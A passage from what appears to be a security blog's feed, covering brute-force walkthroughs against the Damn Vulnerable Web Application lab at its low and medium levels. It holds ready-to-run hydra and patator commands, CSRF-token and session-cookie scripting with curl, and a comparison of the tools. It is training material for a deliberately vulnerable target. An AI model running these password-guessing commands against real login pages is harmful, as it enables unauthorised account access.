&lt;/span&gt;&lt;span class="line"&gt;curl -s -b cookie -d &lt;span class="s2"&gt;&amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.1.${ip}/DVWA/login.php&amp;quot;&lt;/span&gt; &amp;gt;/dev/null
&lt;/span&gt;&lt;span class="line"&gt;rm -f hydra.restore
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;time  &lt;/span&gt;hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/passwords_clarkson_82.txt&lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -F  -u  -t &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;thread&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;  -w &lt;span class="m"&gt;10&lt;/span&gt;  -v  -q  192.168.1.&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;ip&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; ip in &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;33&lt;/span&gt; 44&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.${ip}/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID cookie &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="s1"&gt;'{print $7}'&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b cookie -d &lt;span class="s2"&gt;&amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.1.${ip}/DVWA/login.php&amp;quot;&lt;/span&gt; &amp;gt;/dev/null
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;time  &lt;/span&gt;patator  http_fuzz  &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;GET  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;thread&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.${ip}/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/passwords_clarkson_82.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x ignore:fgrep!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Welcome to the password protected area'&lt;/span&gt;  -x quit:fgrep&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Welcome to the password protected area'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Conclusion"&gt;&lt;/a&gt;
&lt;h3&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;None of the tools are not "perfect"&lt;/strong&gt;. I would say there is not a single "go-to tool", as each is better in certain cases.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hydra&lt;/strong&gt; at designed to be an "&lt;strong&gt;online password brute force tool&lt;/strong&gt;", and has the features and function we need to-do this type of brute force. However, a more complex one (such as anti-CSRF tokens - which happens later), Hydra &lt;strong&gt;will fail at&lt;/strong&gt;. I found it is &lt;strong&gt;the "best" tool to brute force multiple users&lt;/strong&gt;, as it will produce the least amount of requests.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Patator&lt;/strong&gt; at its heart is an "&lt;strong&gt;online fuzzer&lt;/strong&gt;", which can be used to fuzz inputs into the username/password fields to brute force. It &lt;strong&gt;has many more features and options&lt;/strong&gt; than Hydra. I believe it is &lt;strong&gt;the best tool for brute forcing a single user&lt;/strong&gt; (or modules which have dedicated username/password field, which was not the case for web form).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt; is also a fuzzer, as well as offering a lot of other options (it is a &lt;strong&gt;multi-tool&lt;/strong&gt; - hence "suite"). Unless you have a commercial license, &lt;strong&gt;the free version will be much slower&lt;/strong&gt; than the other two options. The upside is, it &lt;strong&gt;allows you to-do the most complex brute force attacks&lt;/strong&gt; (even in the free edition).&lt;/p&gt;

&lt;p&gt;That's it! A how to guide on Damn Vulnerable Web Application (DVWA) to brute force the low level using Hydra and Patator (and Burp), with a comparison guide and how to debug issues with a proxy.&lt;/p&gt;

&lt;p&gt;curl -s -b 'security=low' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;form/,/&amp;lt;\/form/p' | grep -i "&amp;lt;action"|"&amp;lt;input"&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form action="#" method="GET"&amp;gt;&lt;/code&gt; - a GET request to the same URL &lt;code&gt;/DVWA/vulnerabilities/brute/&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;http-get-form&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;http_fuzz  method=GET&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;input type="text" name="username"&amp;gt;&amp;lt;br /&amp;gt;&lt;/code&gt; - username field

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;username=^USER^&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;username=FILE1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;input type="password" AUTOCOMPLETE="off" name="password"&amp;gt;&amp;lt;br /&amp;gt;&lt;/code&gt; - password

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;password=^PASS^&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;username=FILE1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;input type="submit" value="Login" name="Login"&amp;gt;&lt;/code&gt; - action

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;Login=Login&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;Login=Login&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Result:

&lt;ul&gt;
&lt;li&gt;Hydar: &lt;code&gt;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;Login=Login&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><pubDate>Thu, 29 Oct 2015 16:05:00 +0000</pubDate></item><item><title>DVWA - Brute Force (Medium Level) - Time Delay</title><link>https://blog.g0tmi1k.com/dvwa/bruteforce-medium/</link><description>&lt;p&gt;This post is a "how to" guide for &lt;strong&gt;Damn Vulnerable Web Application (DVWA)'s brute force module on the medium security level&lt;/strong&gt;. It is an expansion from the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level (which is a straightforward HTTP GET form attack)&lt;/a&gt;, and then grows into the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/"&gt;"high" security post (which involves CSRF tokens)&lt;/a&gt;. There is also an additional brute force option on the &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;main login screen&lt;/a&gt; (consisting of POST redirects and a incorrect anti-CSRF system).&lt;/p&gt;

&lt;p&gt;&lt;img alt="Brute Force DVWA Medium Level" class="center" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium.png" title="Brute Force DVWA Medium Level" /&gt;&lt;/p&gt;

&lt;p&gt;Once again, let's &lt;strong&gt;pretend we do not know any credentials&lt;/strong&gt; for DVWA.&lt;/p&gt;

&lt;p&gt;Let's &lt;strong&gt;play dumb and brute force&lt;/strong&gt; DVWA... &lt;em&gt;again ...again&lt;/em&gt;!&lt;/p&gt;

&lt;!--more--&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Quick copy/paste&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c dvwa.cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID dvwa.cookie &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s1"&gt;$'\t'&lt;/span&gt; -f7&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b dvwa.cookie -d &lt;span class="s2"&gt;&amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt; &amp;gt;/dev/null
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -F  -u  -t &lt;span class="m"&gt;4&lt;/span&gt;  -w &lt;span class="m"&gt;15&lt;/span&gt;  -v  -V  192.168.1.44  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:S=Welcome to the password protected area:H=Cookie\: security=medium; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;patator  http_fuzz  &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;GET  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;  --max-retries&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou-40.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=medium; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Welcome to the password protected area'&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Objectives"&gt;Objectives&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Setup"&gt;Setup&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Tools"&gt;Tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Creating.a.Session.Cookie"&gt;Creating a Session Cookie&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Information.Gathering"&gt;Information Gathering&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Form.HTML.Code"&gt;Form HTML Code&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Attack.Vectors"&gt;Attack Vectors&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Minimum.Wait.Time"&gt;Minimum Wait Time&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Brute.Forcing"&gt;Brute Forcing&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Hydra..strong."&gt;&lt;strong&gt;Hydra&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Patator..strong."&gt;&lt;strong&gt;Patator&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Summary"&gt;Summary&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Benchmark"&gt;Benchmark&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Why.is.Hydra.slower.than.Patator."&gt;Why is Hydra slower than Patator?&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Objectives"&gt;&lt;/a&gt;
&lt;h2&gt;Objectives&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;The goal is to &lt;strong&gt;brute force an HTTP login&lt;/strong&gt; page.

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;GET requests&lt;/strong&gt; are made via a &lt;strong&gt;form&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;The web page is in a &lt;strong&gt;sub folder&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;Low&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Straight forward HTTP GET&lt;/strong&gt; brute force attack via a &lt;strong&gt;web form&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Bonus: &lt;strong&gt;SQL injection&lt;/strong&gt; (&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#*comingsoon*"&gt;See here for more information&lt;/a&gt;&lt;/del&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;Medium&lt;/a&gt;&lt;/strong&gt;

&lt;ul&gt;
&lt;li&gt;Extends on the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level&lt;/a&gt; - HTTP GET attack via a web form.&lt;/li&gt;
&lt;li&gt;Adds in a &lt;strong&gt;static time delay&lt;/strong&gt; (3 seconds) on failed logins.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/"&gt;High&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Extends on the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level&lt;/a&gt; - HTTP GET attack via a web form.&lt;/li&gt;
&lt;li&gt;This time uses a &lt;strong&gt;random time delay&lt;/strong&gt; (between 0 and 4 seconds) instead.&lt;/li&gt;
&lt;li&gt;Uses an &lt;strong&gt;anti Cross-Site Request Forgery (CSRF) token&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#comingsoon"&gt;Impossible&lt;/a&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;Submits data via HTTP &lt;strong&gt;POST&lt;/strong&gt; via web form&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Accounts will lock out&lt;/strong&gt; after 5 failed logins.

&lt;ul&gt;
&lt;li&gt;Time delay before becoming unlocked (15 minutes).&lt;/li&gt;
&lt;li&gt;Unable to enumerate users on the system.&lt;/li&gt;
&lt;li&gt;Possible &lt;strong&gt;"Denial of Service (DoS)" vector&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#comingsoon"&gt;PHPIDS&lt;/a&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;Does not protect against this attack.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;All attack methods are still the same!&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Setup"&gt;&lt;/a&gt;
&lt;h2&gt;Setup&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Main target: &lt;a href="https://github.com/RandomStorm/DVWA/releases"&gt;DVWA v1.10&lt;/a&gt; (Running on &lt;code&gt;Windows Server 2012 Standard ENG x64&lt;/code&gt; + &lt;code&gt;IIS 8&lt;/code&gt;).

&lt;ul&gt;
&lt;li&gt;Target setup &lt;strong&gt;does not matter too much&lt;/strong&gt; for this - &lt;code&gt;Debian&lt;/code&gt;/&lt;code&gt;Arch Linux&lt;/code&gt;/&lt;code&gt;Windows&lt;/code&gt;, &lt;code&gt;Apache&lt;/code&gt;/&lt;code&gt;Nginx&lt;/code&gt;/&lt;code&gt;IIS&lt;/code&gt;, &lt;code&gt;PHP v5.x&lt;/code&gt;, or &lt;code&gt;MySQL&lt;/code&gt;/&lt;code&gt;MariaDB&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The main target is on the IP (&lt;code&gt;192.168.1.44&lt;/code&gt;), port (&lt;code&gt;80&lt;/code&gt;) and subfolder (&lt;code&gt;/DVWA/&lt;/code&gt;), which is known ahead of time.&lt;/li&gt;
&lt;li&gt;Because the target is Windows, it does not matter about case sensitive URL requests (&lt;code&gt;/DVWA/&lt;/code&gt; vs &lt;code&gt;/dvwa/&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attacker: &lt;a href="https://www.kali.org/"&gt;Kali Linux v2&lt;/a&gt; (+ &lt;a href="https://github.com/g0tmi1k/os-scripts/blob/master/kali.sh"&gt;Personal Custom Post-install Script&lt;/a&gt;).

&lt;ul&gt;
&lt;li&gt;Shell prompt will look different (due to &lt;a href="http://www.zsh.org/"&gt;ZSH&lt;/a&gt;/&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;Oh-My-ZSH&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Added colour to tools output (thanks to &lt;a href="https://github.com/garabik/grc"&gt;GRC&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Both machines are running inside a Virtual Machine (VMware ESXi).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Tools"&gt;&lt;/a&gt;
&lt;h2&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;cURL - Information gathering (used for viewing source code &amp;amp; to automate generating sessions).&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.thc.org/thc-hydra/"&gt;THC-Hydra v8.1&lt;/a&gt; - A brute force tool.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lanjelot/patator"&gt;Patator v0.5&lt;/a&gt; - An alternative brute force tool.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/danielmiessler/SecLists"&gt;SecLists&lt;/a&gt; - General wordlists.

&lt;ul&gt;
&lt;li&gt;These are common, default and small wordlists.&lt;/li&gt;
&lt;li&gt;Instead of using a custom built wordlist, which has been crafted for our target (e.g. generated with &lt;a href="https://digi.ninja/projects/cewl.php"&gt;CeWL&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Creating.a.Session.Cookie"&gt;&lt;/a&gt;
&lt;h2&gt;Creating a Session Cookie&lt;/h2&gt;

&lt;p&gt;This was covered in the first post, &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt;, which will act as a "base" to this post. I'm not going to cover this again, so if things are not clear, I highly suggest you read over the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;previous post&lt;/a&gt; first.&lt;/p&gt;

&lt;p&gt;The command has not changed; the target has not changed, so the output and result will be the same as the levels below.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie --data &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
